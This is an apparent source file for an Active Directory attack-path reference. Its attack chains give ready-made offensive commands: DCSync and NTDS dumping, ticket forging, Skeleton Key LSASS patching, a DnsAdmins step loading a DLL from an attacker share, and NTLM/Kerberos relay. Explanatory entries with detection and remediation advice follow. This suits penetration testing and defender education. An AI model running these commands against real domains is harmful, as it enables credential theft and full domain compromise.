            {
              label: "DCSync using the sync account",
              command: "secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc",
              children: [{ label: "Full on-prem domain compromise", note: "from a server most environments don't treat as Tier 0" }],
            },
          ],
        },
      ],
    },
  },
  {
    id: "seamlesssso-entra-access",
    title: "Seamless SSO Abuse → Entra ID Access as Any User",
    category: "credread",
    summary:
      "Seamless SSO's shared Kerberos key means DCSync-equivalent rights on-prem — nothing Entra-specific — are enough to forge Entra ID access as any synced user, silently, since Seamless SSO doesn't prompt for MFA.",
    root: {
      label: "GetChanges + GetChangesAll",
      edgeId: "DCSync",
      note: "held on the domain object",
      children: [
        {
          label: "Dump the AZUREADSSOACC$ computer account hash",
          command: "secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc-user 'AZUREADSSOACC$'",
          children: [
            {
              label: "Forge a Seamless SSO Kerberos ticket",
              command: "$kerberos = New-AADIntKerberosTicket -SidString $SID -Hash $HASH",
              children: [
                {
                  label: "Exchange it for a real Entra ID access token",
                  command: "Get-AADIntAccessTokenForAADGraph -KerberosTicket $kerberos -Domain $DOMAIN",
                  children: [{ label: "Entra ID access as any synced user, including Global Admins", note: "bypasses MFA — Seamless SSO is designed not to prompt" }],
                },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    id: "golden-saml-chain",
    title: "AD FS Compromise → Golden SAML → Federated App Access",
    category: "credread",
    summary:
      "AD FS's token-signing certificate is the trust anchor for every application federated to it — once it's stolen, forged SAML tokens survive password resets and even krbtgt rotation, since neither is involved.",
    root: {
      label: "Compromise the AD FS server",
      note: "as the AD FS service account or SYSTEM",
      children: [
        {
          label: "Extract the token-signing certificate",
          command: "misc::adfs",
          note: "or via the DKM container — see CVE-2026-56155",
          children: [
            {
              label: "Forge a Golden SAML token",
              command: "New-AADIntSAMLToken -ImmutableID $HASH -Certificate cert.pfx -Issuer 'http://$DC/adfs/services/trust'",
              children: [
                {
                  label: "Access every application trusting this AD FS instance",
                  note: "including Microsoft 365, as any user — no further contact with AD FS needed",
                },
              ],
            },
          ],
        },
      ],
    },
  },

  // ---------------- Batch 4: AS-REP/Silver Ticket, gMSA, built-in-group abuse, relay variant, BadSuccessor ----------------
  {
    id: "asreproast-crack-lateral",
    title: "AS-REP Roasting → Crack → Account Takeover",
    category: "credread",
    summary:
      "No credential, no ACL right, no coercion needed — an account with Kerberos pre-auth disabled hands its AS-REP to anyone who asks, crackable exactly like a Kerberoast hash.",
    root: {
      label: "Find a pre-auth-disabled account",
      note: "DONT_REQ_PREAUTH set on the userAccountControl flag",
      children: [
        {
          label: "Request its AS-REP, no credentials needed",
          command: "GetNPUsers.py $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC -format hashcat -outputfile $OUTFILE",
          children: [
            {
              label: "Crack offline",
              command: "hashcat -m 18200 asrep.txt rockyou.txt",
              children: [
                {
                  label: "Account's plaintext password",
                  children: [{ label: "Authenticate as the account", note: "→ whatever access/rights it holds" }],
                },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    id: "kerberoast-silver-ticket",
    title: "Kerberoast → Silver Ticket",
    category: "credread",
    summary:
      "A cracked service account's hash doesn't have to become an interactive logon — forged directly into a Silver Ticket, it grants access to that one service without ever touching the DC or krbtgt.",
    root: {
      label: "Kerberoast a service account and crack its hash",
      edgeId: "WriteSPN",
      note: "see the WriteSPN → Kerberoast chain for the full first half",
      children: [
        {
          label: "Forge a Silver Ticket for that service",
          command: "kerberos::golden /user:administrator /domain:$DOMAIN /sid:$SID /target:$DC /service:cifs /rc4:$HASH /ptt",
          children: [
            {
              label: "Access to that one service only",
              note: "quieter than a Golden Ticket — no krbtgt involved, harder to detect, but scoped to one SPN",
            },
          ],
        },
      ],
    },
  },
  {
    id: "goldengmsa-domainwide",
    title: "GoldenGMSA — KDS Root Key → Every gMSA in the Domain",
    category: "credread",
    summary:
      "A single ReadGMSAPassword edge only gets you one service account — the KDS root key that AD itself uses to derive gMSA passwords gets you every current and future gMSA at once, computed entirely offline.",
    root: {
      label: "DA-equivalent rights, at least once",
      note: "to read the KDS root key",
      children: [
        {
          label: "Dump the KDS root key(s)",
          command: "GoldenGMSA.exe kdsinfo",
          children: [
            {
              label: "Compute any gMSA's password offline",
              command: "GoldenGMSA.exe compute --sid $SID --kdskey <KDSKeyGUID-from-kdsinfo> --pwdid <ManagedPasswordID-of-target-gMSA>",
              children: [{ label: "Every current and future gMSA in the domain", note: "no msDS-ManagedPassword read access ever needed" }],
            },
          ],
        },
      ],
    },
  },
  {
    id: "dnsadmins-serverleveldll",
    title: "DnsAdmins → ServerLevelPluginDll → SYSTEM on a DC",
    category: "local",
    summary:
      "DnsAdmins can point the DNS Server service at an arbitrary DLL — since DNS almost always runs on a domain controller, that's kernel-adjacent code execution disguised as a config change.",
    root: {
      label: "MemberOf: DnsAdmins",
      edgeId: "MemberOf-DnsAdmins",
      children: [
        {
          label: "Point the DNS service at a malicious DLL",
          command: "dnscmd $DC /config /serverlevelplugindll \\\\$ATTACKER\\share\\evil.dll",
          children: [
            {
              label: "Restart the DNS service to load it",
              command: "sc.exe \\\\$DC stop dns",
              children: [{ label: "DLL loads under the DNS service's SYSTEM context", note: "on a domain controller" }],
            },
          ],
        },
      ],
    },
  },
  {
    id: "backupoperators-ntds",
    title: "Backup Operators → NTDS Extraction → Offline DCSync",
    category: "local",
    summary:
      "SeBackupPrivilege bypasses every ACL for the backup API specifically — including the one protecting ntds.dit — so Backup Operators reaches the entire password database without ever calling DRSGetNCChanges.",
    root: {
      label: "MemberOf: Backup Operators",
      edgeId: "MemberOf-BackupOperators",
      note: "SeBackupPrivilege / SeRestorePrivilege on a DC",
      children: [
        {
          label: "Shadow-copy the DC's volume",
          command: "diskshadow /s diskshadow_script.txt",
          children: [
            {
              label: "Pull ntds.dit and the SYSTEM hive out of the shadow copy",
              command: "robocopy /b e:\\windows\\ntds\\ ntds_backup ntds.dit",
              children: [
                {
                  label: "Dump every credential in the domain, entirely offline",
                  command: "secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL",
                  note: "same payoff as DCSync, without ever holding GetChanges/GetChangesAll",
                },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    id: "accountoperators-escalate",
    title: "Account Operators → Object Manipulation → Escalation",
    category: "local",
    summary:
      "Broad create/modify rights over non-protected objects is easy to underestimate — it's a direct path to a freshly created or repurposed account with whatever access the operator grants it next.",
    root: {
      label: "MemberOf: Account Operators",
      edgeId: "MemberOf-AccountOperators",
      note: "create/modify/delete rights over most non-protected objects, domain-wide",
      children: [
        {
          label: "Add self to a group, or reset a non-protected user's password",
          command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add groupMember $TARGETOBJECT $USER",
          children: [{ label: "Whatever access that group/account holds", note: "frequently chains into further privesc" }],
        },
      ],
    },
  },
  {
    id: "coercion-relay-smb",
    title: "Coercion → NTLM Relay → SMB → Local Admin",
    category: "credread",
    summary:
      "The baseline relay chain that the LDAP/ADCS variants build on: coerced authentication relayed straight to SMB on a target where the coerced identity already has admin rights.",
    root: {
      label: "Coerce a privileged account to authenticate",
      note: "PrinterBug / PetitPotam / DFSCoerce",
      command: "python3 PetitPotam.py -d $DOMAIN -u $USER -p $PASS $ATTACKER $DC",
      children: [
        {
          label: "Relay to SMB on a target where that identity is admin",
          command: "sudo ntlmrelayx.py -tf targets.txt -smb2support",
          children: [{ label: "Local admin / SYSTEM on every target where the relay succeeds" }],
        },
      ],
    },
  },
  {
    id: "privexchange-dcsync",
    title: "PrivExchange → WriteDacl on Domain → DCSync → Golden Ticket",
    category: "credread",
    summary:
      "Exchange's own machine account (and Exchange Windows Permissions members) holds WriteDacl on the domain object by default — a leftover install artifact that PrivExchange turns into a coercion primitive.",
    root: {
      label: "MemberOf: Exchange Windows Permissions",
      edgeId: "MemberOf-ExchangeWindowsPermissions",
      note: "WriteDacl on the domain object — a default artifact of installing Exchange",
      children: [
        {
          label: "Coerce the Exchange server to authenticate",
          command: "python3 privexchange.py -ah $ATTACKER $TARGET -u $USER -d $DOMAIN -p $PASS",
          children: [
            {
              label: "Relay to LDAP, grant self DCSync",
              command: "sudo ntlmrelayx.py -t ldap://$DC --escalate-user $USER",
              children: [
                {
                  label: "DCSync",
                  command: "secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc-user krbtgt",
                  children: [{ label: "Golden Ticket", note: "→ Domain Admin, from an Exchange install nobody re-audited" }],
                },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    id: "badsuccessor-chain",
    title: "BadSuccessor — Create Child → dMSA → Any Privileged Account",
    category: "acl",
    summary:
      "Windows Server 2025's dMSA migration feature trusts msDS-ManagedAccountPrecededByLink without verifying any real migration relationship — Create Child rights on essentially any OU is enough to point a new dMSA at Domain Admin.",
    root: {
      label: "Create Child rights on any OU",
      note: "a delegation common enough to be granted to helpdesk-tier groups",
      children: [
        {
          label: "Create a dMSA preceding a privileged account",
          command:
            "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add badSuccessor $TARGETOBJECT -t 'CN=administrator,CN=Users,DC=corp,DC=local' --ou 'OU=Employees,DC=corp,DC=local' --prepatch",
          children: [
            {
              label: "Windows treats this as a genuine privilege migration",
              children: [{ label: "Authenticate as the dMSA", note: "→ inherits the preceded account's full effective privilege" }],
            },
          ],
        },
      ],
    },
  },

  // ---------------- Batch 5: Skeleton Key, SCCM, RODC ----------------
  {
    id: "skeleton-key-persistence",
    title: "Skeleton Key — Universal Master Password",
    category: "acl",
    summary:
      "Patched directly into LSASS on a live DC, this doesn't touch any account's real password at all — every account suddenly authenticates with either its own password or the same attacker-chosen master password.",
    root: {
      label: "DA-equivalent rights on a domain controller",
      children: [
        {
          label: "Patch LSASS in memory",
          command: "privilege::debug\nmisc::skeleton",
          children: [
            {
              label: "Every account now accepts a second, universal password",
              note: "in-memory only — cleared on reboot, doesn't survive a DC restart",
              children: [{ label: "Authenticate as any user, domain-wide", note: "without ever knowing or resetting their real password" }],
            },
          ],
        },
      ],
    },
  },
  {
    id: "sccm-site-takeover",
    title: "SCCM Site Server Coercion → Relay → Push Payload to Every Managed Device",
    category: "credread",
    summary:
      "Coercing the SCCM site server's own machine account plays out just like PetitPotam against a DC — except the payoff is administrative control of every endpoint SCCM manages, often a far larger blast radius than the site server itself.",
    root: {
      label: "Coerce the SCCM site server to authenticate",
      children: [
        {
          label: "Relay to gain site-level administrative access",
          command: "sccmhunter.py relay -u $USER -p $PASS -d $DOMAIN -ip $DC",
          children: [
            {
              label: "Full Administrator on the SCCM console/AdminService",
              children: [
                {
                  label: "Push and execute a payload on any managed device",
                  command: "SharpSCCM.exe exec -d $TARGETOBJECT -sms-provider $TARGET -payload cmd.exe",
                  note: "legitimate SCCM deployment functionality, used offensively",
                  children: [{ label: "Code execution on every device SCCM manages" }],
                },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    id: "sccm-naa-lateral",
    title: "SCCM Network Access Account → Lateral Movement",
    category: "credread",
    summary:
      "Any device SCCM manages caches the Network Access Account's credential locally so the client can reach deployment content — local admin on one managed endpoint is enough to read it, no site-level access required.",
    root: {
      label: "Local admin on any SCCM-managed device",
      children: [
        {
          label: "Read the cached Network Access Account credential",
          command: "SharpSCCM.exe local naa",
          children: [
            {
              label: "NAA credential",
              note: "used by every client to reach SCCM content shares",
              children: [
                {
                  label: "Alternative: decrypt captured PXE boot media",
                  command: "SharpSCCM.exe get pxe -f media.pxe -p 'MediaPassword'",
                  note: "same NAA/task-sequence secrets, no managed endpoint needed — just captured PXE traffic",
                },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    id: "rodc-filtered-dcsync",
    title: "RODC Filtered Replication — DCSync Variant",
    category: "credread",
    summary:
      "An RODC-linked account with GetChangesInFilteredSet rights doesn't grant full DCSync — but the filtered attribute set it does cover still leaks real secrets, without ever needing GetChanges/GetChangesAll on the domain object.",
    root: {
      label: "GetChangesInFilteredSet",
      edgeId: "GetChangesInFilteredSet",
      note: "narrower than full DCSync — commonly seen on RODC-related accounts",
      children: [
        {
          label: "Dump the accounts within the filtered set",
          command: "secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc-user $TARGETOBJECT",
          children: [{ label: "Secrets for accounts the RODC is allowed to cache", note: "scoped, not domain-wide like full DCSync" }],
        },
      ],
    },
  },
  {
    id: "rodc-krbtgt-golden-ticket",
    title: "RODC Compromise → Own krbtgt → Golden Ticket (RODC-scoped)",
    category: "credread",
    summary:
      "Branch-office RODCs are frequently weaker targets than a hub DC, and each one holds its own dedicated krbtgt account — compromising just that account turns local RODC access into full ticket-forging, without ever touching the domain's real krbtgt.",
    root: {
      label: "Local admin / DSRM on a compromised RODC",
      note: "often the softest target in the environment — physically exposed, less monitored than a hub-site DC",
      children: [
        {
          label: "Dump the RODC's own krbtgt account",
          command: "secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc-user $TARGETOBJECT",
          note: "$TARGETOBJECT = that RODC's krbtgt_<number> account name",
          children: [
            {
              label: "RODC-specific krbtgt NT hash",
              children: [
                {
                  label: "Forge a golden ticket with the RODC's krbtgt",
                  command: "kerberos::golden /user:administrator /domain:$DOMAIN /sid:$SID /krbtgt:$HASH /ptt",
                  children: [
                    {
                      label: "Access via that RODC only",
                      note: "writable DCs reject the ticket outright — they validate against the domain's real krbtgt, not this one — but the RODC itself, and anything relying on it, honors it",
                    },
                  ],
                },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    id: "rodc-object-rights-keylist-attack",
    title: "RODC Object Rights → msDS-RevealOnDemandGroup → Key List Attack → Domain Admin",
    category: "credread",
    summary:
      "Starts from pure ACL control over the RODC's AD object — no host access needed yet — and ends with the actual Domain Admin password hash, not just access scoped to the RODC.",
    root: {
      label: "GenericAll / GenericWrite / WriteDacl / Owns / WriteOwner",
      edgeId: "RODCRevealGroupAbuse",
      note: "any one of these on the RODC computer object implies WriteProperty over msDS-RevealOnDemandGroup / msDS-NeverRevealGroup",
      children: [
        {
          label: "Add the Domain Admin to msDS-RevealOnDemandGroup",
          command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set object $TARGETOBJECT --attr msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local' -v 'CN=Administrator,CN=Users,DC=domain,DC=local'",
          note: "clear msDS-NeverRevealGroup first if the target account is listed there — it silently overrides this",
          children: [
            {
              label: "The DA's credentials become eligible for RODC caching",
              children: [
                {
                  label: "Dump the RODC's own krbtgt with host/DSRM admin access",
                  command: "secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc-user $TARGETOBJECT",
                  note: "→ see the RODC Compromise → Own krbtgt chain for the golden-ticket path from here",
                  children: [
                    {
                      label: "Conduct a Kerberos key list attack",
                      note: "abuses the RODC-only KERB-KEY-LIST-REQ PA-DATA type to request the DA's actual long-term key straight from a writable DC, rather than waiting for real credential replication",
                      children: [
                        { label: "Domain Administrator's real password hash", note: "→ full domain compromise, not just RODC-scoped access" },
                      ],
                    },
                  ],
                },
              ],
            },
          ],
        },
      ],
    },
  },

  // ---------------- Batch 6: passive poisoning as a relay entry point (no coercion vuln needed) ----------------
  {
    id: "mitm6-relay",
    title: "mitm6 / Responder → NTLM Relay → SMB / LDAP / ADCS",
    category: "credread",
    summary:
      "Every relay chain elsewhere in this reference starts from actively coercing a specific vulnerable service — this is the passive alternative: just being on the network is enough, no coercion bug required at all.",
    root: {
      label: "mitm6 — become the network's IPv6 DNS server",
      note: "or Responder for LLMNR/NBT-NS poisoning on IPv4-only segments",
      command: "mitm6 -d $DOMAIN",
      children: [
        {
          label: "Windows' IPv6-preferred behavior sends auth your way",
          note: "hosts querying WPAD/DNS get pointed at the attacker",
          children: [
            {
              label: "Relay the captured NTLM authentication",
              command: "sudo ntlmrelayx.py -tf targets.txt -smb2support",
              children: [
                { label: "Relay to SMB", note: "→ local admin/SYSTEM on any target without SMB signing enforced" },
                { label: "Relay to LDAP instead", note: "→ see the Coercion → NTLM Relay → LDAP chains for the Shadow Credentials/RBCD payoff — identical relay target, passive entry point" },
                { label: "Relay to AD CS web enrollment instead", note: "→ see the Coercion → Relay → ADCS ESC8 chain — same certificate payoff, no PetitPotam needed" },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    id: "dns-kerberos-relay-adcs",
    title: "DNS SOA/TKEY Poisoning → Kerberos Relay → ADCS (ESC8)",
    category: "adcs",
    summary:
      "Where the NTLM relay chain above needs NTLM to be reachable at all, this variant works even when NTLM is disabled domain-wide or the client sits in Protected Users — the whole path runs on Kerberos instead.",
    root: {
      label: "mitm6 — poison IPv6 DNS to intercept a dynamic-update SOA/TKEY exchange",
      command: "mitm6 -i $ATTACKER -d $DOMAIN -hw $TARGET --relay $ADCS_FQDN -v",
      children: [
        {
          label: "Victim Kerberos-authenticates the TKEY request to the attacker",
          note: "the TKEY exchange requires signing, but that only rules out relaying to LDAP — HTTP and HOST-mapped services are still fair game",
          children: [
            {
              label: "Relay the AP-REQ to ADCS web enrollment",
              command: "krbrelayx.py --target http://$ADCS_FQDN/certsrv/ -ip $ATTACKER --victim $TARGETOBJECT --adcs --template Machine",
              children: [
                { label: "Machine certificate for the coerced/poisoned host", note: "→ same ESC8 payoff as the NTLM relay chain, reachable even when NTLM itself is unavailable" },
              ],
            },
          ],
        },
      ],
    },
  },
];

// Flattens every label/note/command in a chain's node tree into one
// lowercase string, so global search can match on a step deep inside a
// chain (e.g. "S4U2Proxy") even though that term never appears in the
// chain's own title/summary. CHAINS is static, so this runs once at module
// load rather than being recomputed on every search keystroke.
function chainSearchText(chain) {
  const parts = [chain.title, chain.summary];
  const walk = (node) => {
    parts.push(node.label, node.note, node.command);
    node.children?.forEach(walk);
  };
  walk(chain.root);
  return parts.filter(Boolean).join(" ").toLowerCase();
}
const CHAIN_SEARCH_TEXT = new Map(CHAINS.map((c) => [c.id, chainSearchText(c)]));

// ============================================================
// LEARNBOOK — why/how/effect explanations, separate from the
// command reference and the edge-abuse playbooks above.
// ============================================================
const LEARN_CATEGORIES = [
  { id: "kerberos", label: "Kerberos" },
  { id: "acl", label: "ACL & Object Rights" },
  { id: "delegation", label: "Delegation" },
  { id: "credaccess", label: "Credential Access" },
  { id: "adcs", label: "AD CS (Certificate Services)" },
  { id: "cve", label: "Recent CVEs (2026)" },
  { id: "reference", label: "Tool References" },
];

const LEARN = [
  {
    id: "kerberos-basics",
    category: "kerberos",
    title: "How Kerberos authentication works",
    why: "Almost every AD attack either abuses or forges a piece of this exchange, so the tickets make no sense without the flow.",
    body: "A client requests a TGT (Ticket Granting Ticket) from the KDC by proving knowledge of its password (pre-authentication). The KDC returns a TGT encrypted with the krbtgt account's hash — the client can't read it, only present it. When the client wants to reach a service, it sends the TGT back to the KDC in an TGS-REQ; the KDC returns a TGS (service ticket) encrypted with that service account's own password hash. The client presents the TGS to the service, which decrypts it with its own hash to verify the client's identity — no network call back to the KDC needed at that point.",
    effect: "Both the TGT and TGS are encrypted with account password hashes, not signed with anything an attacker can't derive — so if you know (or dump) the right hash, you can decrypt or forge tickets yourself.",
  },
  {
    id: "kerberoasting-mechanism",
    category: "kerberos",
    title: "Why Kerberoasting works",
    why: "It's the single highest-value low-effort attack in AD because it needs zero elevated privilege to attempt.",
    body: "Any authenticated domain user can request a TGS for any service that has an SPN registered — that's normal Kerberos behavior, not a bug. The returned TGS is encrypted with the service account's password hash (usually RC4/NTLM, sometimes AES). Because the attacker already possesses that ciphertext and knows the expected plaintext structure, the password can be cracked entirely offline with no further contact with the domain.",
    effect: "Recovers the plaintext password of the service account if it's weak — often a legacy service account with old, never-rotated, or overly simple credentials.",
  },
  {
    id: "asreproast-mechanism",
    category: "kerberos",
    title: "Why AS-REP roasting works",
    why: "It requires no valid credential at all — just a username.",
    body: "Kerberos pre-authentication normally requires the client to encrypt a timestamp with its password hash before the KDC issues a TGT, proving the client knows the password. If an account has the 'Do not require Kerberos preauthentication' flag set, the KDC skips that check and returns the AS-REP directly, portions of which are encrypted with the account's password hash — with no proof of identity required first.",
    effect: "The AS-REP is crackable offline exactly like a kerberoast hash, but obtainable with zero prior authentication.",
  },
  {
    id: "printerbug-mechanism",
    category: "kerberos",
    title: "PrinterBug (MS-RPRN) — coercion, not code execution",
    why: "Frequently confused with PrintNightmare, but it's a completely different bug class — a coercion primitive rather than remote code execution — and often still viable when PrintNightmare itself is long patched.",
    body: "The Print Spooler's MS-RPRN interface exposes RpcRemoteFindFirstPrinterChangeNotification(Ex), meant to let a client register for print-job change notifications from a remote print server. Calling it against a machine with the spooler service running (default on Windows Server, including DCs, unless the service is disabled) makes that machine's own computer account authenticate back to whatever host the notification callback points at — an attacker-controlled listener, if the RPC call is crafted that way. No exploit or memory corruption involved: it's a legitimate RPC feature being used exactly as designed, just pointed somewhere the operator didn't intend.",
    effect: "A coerced machine-account authentication (usually NTLM, sometimes Kerberos) that's directly relayable — into SMB for local admin/SYSTEM, into ADCS web/RPC enrollment for a certificate (ESC8/ESC11), or into DCSync via LDAP if the coerced account is a domain controller.",
    detection: "Monitor for RPC calls to the spooler's RpcRemoteFindFirstPrinterChangeNotification(Ex) method from unexpected source hosts, and for the resulting outbound authentication attempts to non-standard destinations.",
    remediation: "Disable the Print Spooler service on servers and DCs that don't need it (most don't), or apply Microsoft's mitigations restricting spooler remote connections; the underlying fix is preventing the coerced auth from being relayable at all — enforce SMB signing and Extended Protection for Authentication on every service the coercion could be relayed to.",
  },
  {
    id: "printnightmare-mechanism",
    category: "kerberos",
    title: "PrintNightmare (CVE-2021-34527/CVE-2021-1675) — spooler RCE, not coercion",
    why: "The inverse mix-up of PrinterBug: this one really is remote code execution, distinguishing it sharply from the coercion-only PrinterBug despite both living in the same spooler service.",
    body: "The print spooler's RpcAddPrinterDriver(Ex) RPC call is meant to let an administrator install a printer driver on a print server. A missing access check let a low-privileged, authenticated domain user supply an arbitrary, attacker-controlled driver DLL through this call — the spooler service (running as SYSTEM) loads and executes that DLL immediately, both against a remote target over the network and locally as a privilege-escalation primitive on a single box.",
    effect: "SYSTEM-level code execution, either remotely against any machine with an exposed, vulnerable spooler service, or locally as a low-priv-to-SYSTEM privilege escalation — full compromise of the target, not just a relayable authentication like PrinterBug.",
    detection: "Monitor for RpcAddPrinterDriver(Ex) calls installing drivers from unusual paths or unsigned/unexpected publishers, and for new services or DLLs appearing under the spooler's driver directories without a corresponding legitimate print-driver deployment.",
    remediation: "Apply the July 2021 patches (KB5004945 and follow-ups); where patching isn't immediately possible, disable the Print Spooler service entirely (especially on domain controllers) or restrict driver installation to administrators via Point and Print restrictions.",
  },
  {
    id: "acl-fundamentals",
    category: "acl",
    title: "How ACL/DACL abuse works",
    why: "This is the backbone of most BloodHound attack paths — more common in practice than any single exploit.",
    body: "Every AD object has a DACL (Discretionary Access Control List) made of ACEs (Access Control Entries), each granting a specific right (GenericAll, GenericWrite, WriteOwner, WriteDacl, etc.) to a specific principal (user, group, or computer). These rights are frequently granted broadly — e.g. a helpdesk group given password-reset rights over all users, or a service account left with write access to a group it once needed to manage. BloodHound's core value is walking these ACEs transitively: if you control principal A, and A has a write-capable ACE on object B, you effectively control B too — and so on down the chain.",
    effect: "A single overprivileged ACE, three hops away from your current access, can be the entire path to Domain Admin — this is why ACL misconfigurations are usually a bigger real-world risk than missing patches.",
    links: [
      { label: "Impacket (fortra/impacket) — includes dacledit.py, owneredit.py, and every other ACL-editing script referenced throughout this reference", url: "https://github.com/fortra/impacket" },
    ],
  },
  {
    id: "shadow-credentials-mechanism",
    category: "acl",
    title: "How Shadow Credentials work",
    why: "It's quietly become the preferred takeover method over password resets, since it doesn't break the legitimate user's access or generate a password-change event.",
    body: "Windows Hello for Business and PKINIT support login via a certificate whose public key is registered on the target account's msDS-KeyCredentialLink attribute. If you can write to that single attribute (via GenericWrite, GenericAll, or the specific AddKeyCredentialLink right), you can add your own attacker-generated key without ever touching the account's password. You then request a TGT for that account via PKINIT using the corresponding private key.",
    effect: "Full authentication as the target — including recovery of their NTLM hash via the PKINIT exchange (the 'UnPAC-the-hash' technique) — with no visible password change.",
  },
  {
    id: "delegation-types",
    category: "delegation",
    title: "Unconstrained vs. constrained vs. resource-based delegation",
    why: "These are three different mechanisms with different abuse paths, and mixing them up leads to picking the wrong tool.",
    body: "Unconstrained delegation lets a computer cache and reuse the TGT of any user who authenticates to it — whoever connects, their full TGT ends up sitting in memory on that box. Constrained delegation restricts a computer to impersonating users only toward a specific pre-approved list of services (msDS-AllowedToDelegateTo), using the S4U2Self and S4U2Proxy Kerberos extensions. Resource-based constrained delegation (RBCD) flips the trust direction: instead of the front-end computer being configured to delegate, the back-end resource lists which accounts are allowed to act on its behalf (msDS-AllowedToActOnBehalfOfOtherIdentity) — and critically, a computer object can often write that attribute on itself if a user has GenericWrite over it, or if MachineAccountQuota lets them create one.",
    effect: "Each type gives a different-shaped impersonation capability — unconstrained is opportunistic and passive, constrained delegation is targeted-but-fixed, and RBCD can often be self-granted by an attacker who doesn't already have any delegation configured.",
  },
  {
    id: "dcsync-mechanism",
    category: "credaccess",
    title: "How DCSync works",
    why: "It's the cleanest full-domain-compromise technique because it never touches a domain controller's disk or LSASS — it just asks nicely, using a legitimate protocol.",
    body: "Domain controllers replicate directory data between each other using MS-DRSR (the Directory Replication Service Remote Protocol). Any principal holding the Replicating Directory Changes and Replicating Directory Changes All extended rights on the domain object can call this same protocol and ask a DC to 'replicate' account data to them — including password hashes — exactly as another DC would. By default, only Domain Admins, Enterprise Admins, and Domain Controllers hold these rights, but they're occasionally delegated to service accounts (e.g. Azure AD Connect) without realizing the implication.",
    effect: "Every password hash in the domain, including krbtgt, obtained via a protocol that looks like normal DC-to-DC traffic — much quieter than dumping LSASS on a DC directly.",
  },
  {
    id: "golden-silver-mechanism",
    category: "credaccess",
    title: "Golden vs. silver tickets — what's actually being forged",
    why: "Both rely on the same core Kerberos weakness — that tickets are just data encrypted with a hash you might possess — but they forge different parts of the exchange.",
    body: "A golden ticket forges a full TGT by encrypting it with the krbtgt account's hash, the same key a real domain controller would use — since you're not asking a DC to build the ticket, you're building it yourself. Because the KDC trusts the resulting signature without contacting anything else, you can put whatever username, group memberships, and expiry you want into it. A silver ticket is narrower: it forges a TGS directly for one specific service, using that service account's own hash — never touching the krbtgt, and never touching the KDC or a domain controller's logs at all, since the target service decrypts and trusts the ticket entirely locally.",
    effect: "Golden tickets grant domain-wide access as any user until krbtgt is rotated twice; silver tickets grant access to one specific service only, but leave almost no trace since the DC is never involved.",
  },
  {
    id: "ntlm-relay-mechanism",
    category: "credaccess",
    title: "Why NTLM relay works",
    why: "It's the reason coercion tools like PetitPotam matter — relay is the payoff, coercion is just the delivery mechanism.",
    body: "NTLM authentication is a three-message challenge-response handshake that never includes the password itself. Critically, NTLM has no built-in way for the party receiving the authentication to prove to the client which server it actually is — so a machine sitting in the middle can simply forward (relay) the client's challenge-response to a completely different target server, and that target has no way to tell the difference between the real client authenticating directly and the relay happening. If the target doesn't require SMB/LDAP signing, the relayed session is accepted as if the original client had connected directly.",
    effect: "The attacker never learns the password or hash, but gains an authenticated session as the victim against whatever target they chose to relay to — commonly LDAP (for ACL writes) or the AD CS web enrollment endpoint (for a certificate).",
  },
  {
    id: "adcs-fundamentals",
    category: "adcs",
    title: "AD CS fundamentals — why certificates became an AD attack surface",
    why: "Necessary context before any individual ESC makes sense.",
    body: "Active Directory Certificate Services (AD CS) issues X.509 certificates that can be used to authenticate to AD via PKINIT, exactly like a password can. A Certificate Authority (CA) issues certs based on Certificate Templates, which define who can enroll, what the certificate can be used for (its Extended Key Usages), and whether the requester can influence fields like the Subject Alternative Name (SAN). Because AD CS predates most of today's security thinking around it, templates were routinely left with permissive defaults, and the whole system was mapped by SpecterOps' 'Certified Pre-Owned' research into eight primary escalation classes (ESC1–ESC8), with community research since adding more.",
    effect: "A certificate is functionally a long-lived, often-unmonitored alternative credential — so a misconfigured template or CA is frequently a stealthier and more durable path to Domain Admin than any Kerberos attack.",
  },
  {
    id: "esc1",
    category: "adcs",
    title: "ESC1 — Misconfigured certificate template (SAN + client auth)",
    why: "The original and still most common ADCS finding.",
    body: "A template that (a) allows the requester to supply their own Subject Alternative Name, (b) has an EKU permitting client authentication, and (c) grants enrollment rights to a low-privileged group, lets any of those users request a certificate claiming to be anyone — including Domain Admin — simply by putting that identity in the SAN field of their request.",
    effect: "Full impersonation of the chosen identity once the resulting certificate is used to authenticate via PKINIT.",
    detection: "Audit certificate templates for CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT combined with client-auth EKUs and broad enrollment permissions — Certipy's `find -vulnerable` automates this.",
    remediation: "Remove enrollee-supplied-subject capability from client-auth templates, or restrict enrollment rights to only the principals that genuinely need it.",
  },
  {
    id: "esc2",
    category: "adcs",
    title: "ESC2 — Any Purpose / no EKU restriction",
    why: "Broadens what a compromised template can be used for beyond client authentication.",
    body: "A template with the Any Purpose EKU, or no EKU restriction at all, produces certificates usable for any purpose the certificate infrastructure supports — including client authentication even if that wasn't the template's intended use, and including acting as an Enrollment Agent for ESC3-style abuse.",
    effect: "Flexible abuse surface — can often be chained into the same impact as ESC1 or ESC3 depending on what else the template allows.",
    detection: "Flag templates with the Any Purpose OID (2.5.29.37.0) or an empty EKU list combined with non-default enrollment rights.",
    remediation: "Scope EKUs explicitly to the template's actual intended use; avoid Any Purpose entirely for templates with broad enrollment rights.",
  },
  {
    id: "esc3",
    category: "adcs",
    title: "ESC3 — Enrollment Agent template abuse",
    why: "Lets an attacker request certificates for other users without ever touching those accounts.",
